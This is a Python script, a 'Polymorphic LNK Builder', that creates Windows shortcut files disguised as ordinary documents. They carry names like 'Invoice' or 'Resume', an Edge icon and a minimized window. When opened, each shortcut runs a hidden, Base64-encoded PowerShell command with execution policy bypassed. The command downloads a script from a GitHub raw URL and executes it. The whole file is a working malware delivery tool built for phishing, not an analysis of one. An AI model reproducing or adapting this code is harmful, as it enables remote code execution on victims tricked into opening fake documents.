# poly_lnk.py â€” Polymorphic LNK Builder
# Generates unique .lnk files via WScript.Shell COM
# PS1 structure matches build_nabgo.ps1 for correct LinkFlags (0x000008F5)
# Uniqueness via randomized output paths and timestamps

import os
import hashlib
import random
import subprocess
import tempfile


def build_short_cmd():
    cmd = (
        '[Net.ServicePointManager]::SecurityProtocol='
        '[Net.SecurityProtocolType]::Tls12;'
        'IEX(New-Object Net.WebClient).DownloadString('
        "''https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/x.ps1''"
        ')'
    )
    return cmd


def random_filename():
    names = [
        "Meeting Notes", "Project Plan", "Invoice", "Resume",
        "Quarterly Report", "Travel Itinerary", "Budget Analysis",
        "Contract Draft", "Meeting Minutes", "Performance Review",
        "Client Proposal", "Technical Specs", "Roadmap 2026",
        "NDA", "Presentation", "Workshop Slides", "Design Doc",
        "Status Update", "Risk Assessment", "Audit Report"
    ]
    suffix = random.choice([
        "", f" {random.randint(2024,2027)}", f" #{random.randint(1,99)}",
        " (Final)", " (Draft)", " v2", " Copy"
    ])
    return f"{random.choice(names)}{suffix}.lnk"


def build_lnk(output_path):
    """Generate PS1 matching build_nabgo.ps1 structure, run via -File."""
    short_cmd = build_short_cmd()

    ps_script = (
        "$shortCmd = '" + short_cmd + "'\n"
        "$bytes = [Text.Encoding]::Unicode.GetBytes($shortCmd)\n"
        "$b64 = [Convert]::ToBase64String($bytes)\n"
        "$pwshPath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n"
        "$argsStr = \"--headless $pwshPath -NoP -EP Bypass -EncodedCommand $b64\"\n"
        f"$lnkPath = \"{output_path}\"\n"
        "Remove-Item $lnkPath -Force -EA 0\n"
        "$wsh = New-Object -ComObject WScript.Shell\n"
        "$lnk = $wsh.CreateShortcut($lnkPath)\n"
        "$lnk.TargetPath = \"C:\\Windows\\System32\\conhost.exe\"\n"
        "$lnk.Arguments = $argsStr\n"
        "$lnk.IconLocation = \"%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe,11\"\n"
        "$lnk.Description = \"Travel Plan Document\"\n"
        "$lnk.WindowStyle = 7\n"
        "$lnk.Save()\n"
        'Write-Output "LNK_OK"\n'
    )

    tmp = os.path.join(tempfile.gettempdir(), f"_lb_{random.randint(10000,99999)}.ps1")
    with open(tmp, 'w', encoding='utf-8') as f:
        f.write(ps_script)

    ps_exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    result = subprocess.run(
        [ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tmp],
        capture_output=True, text=True, timeout=15
    )

    try:
        os.remove(tmp)
    except:
        pass

    return result.returncode == 0 and "LNK_OK" in result.stdout


def main():
    print("=" * 50)
    print("  POLYMORPHIC LNK BUILDER")
    print("  Each run = unique LNK file")
    print("=" * 50)
    print()

    outdir = os.path.join(os.path.expanduser("~"), "Downloads")
    os.makedirs(outdir, exist_ok=True)

    fname = random_filename()
    output_path = os.path.join(outdir, fname)

    print(f"  Output: {fname}")
    print("  Building LNK...")

    ok = build_lnk(output_path)

    if not ok:
        print("  FAILED to build LNK")
        input("\n  Press Enter to exit...")
        return

    with open(output_path, 'rb') as f:
        file_data = f.read()
    sha = hashlib.sha256(file_data).hexdigest()

    print(f"  File:      {fname}")
    print(f"  Size:      {len(file_data)} bytes")
    print(f"  SHA256:    {sha}")
    print()
    print("  Done!")
    input("\n  Press Enter to exit...")


if __name__ == '__main__':
    main()
